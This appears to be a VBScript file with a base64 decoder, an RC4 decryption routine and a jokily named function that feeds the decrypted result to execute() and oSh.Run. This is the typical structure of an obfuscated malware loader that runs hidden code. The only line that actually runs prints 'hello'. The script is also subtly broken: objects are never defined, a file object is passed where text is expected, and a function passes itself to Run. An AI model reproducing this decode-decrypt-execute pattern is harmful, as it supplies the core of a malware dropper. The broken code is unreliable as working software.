Function hai(base64)
    Dim dom, el
    Const adTypeBinary = 1
    Const adTypeText = 2
    Set dom = CreateObject("Microsoft.XMLDOM")
    Set el = dom.createElement("tmp")
    el.dataType = "bin.base64"
    el.text = base64
    bin = el.nodeTypedValue
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = adTypeBinary
    stream.Open
    stream.Write bin
    stream.Position = 0
    stream.Type = adTypeText
    stream.CharSet = "windows-1252"
    hai = stream.ReadText
End Function
Function oh(msg, key)
    Dim S(256)
    Dim klen
    Dim i, j, tmp
    Dim n
    Dim k
    klen = Len(key)
    For i = 0 To 255
        S(i) = i
    Next
    j = 0
    For i = 0 To 255
        j = (j + S(i) + Asc(Mid(key, 1 + (i Mod klen))) ) Mod 256
        tmp = S(i)
        S(i) = S(j)
        S(j) = tmp
    Next
    i = 0
    j = 0
    oh = ""
    For n = 0 To (Len(msg) - 1)
        i = (i + 1) Mod 256
        j = (j + S(i)) Mod 256
        tmp = S(i)
        S(i) = S(j)
        S(j) = tmp
        k = S((S(i) + S(j)) Mod 256)
        oh = oh & Chr(Asc(Mid(msg, n + 1, 1)) Xor k)
    Next
End Function
Function SnoopyDoopyDoooooooooo()
    SnoopyDoopyDoooooooooo = fso.GetSpecialFolder(250)
End Function

Function PetMeLikeATurtle()
    Call execute(oh(hai(fso.CreateTextFile("WimmyMeBrah", "sn00gle-fl00gle-p00dlekins")), "yummy"))
    Call oSh.Run(PetMeLikeATurtle)
End Function
WScript.Echo "hello"
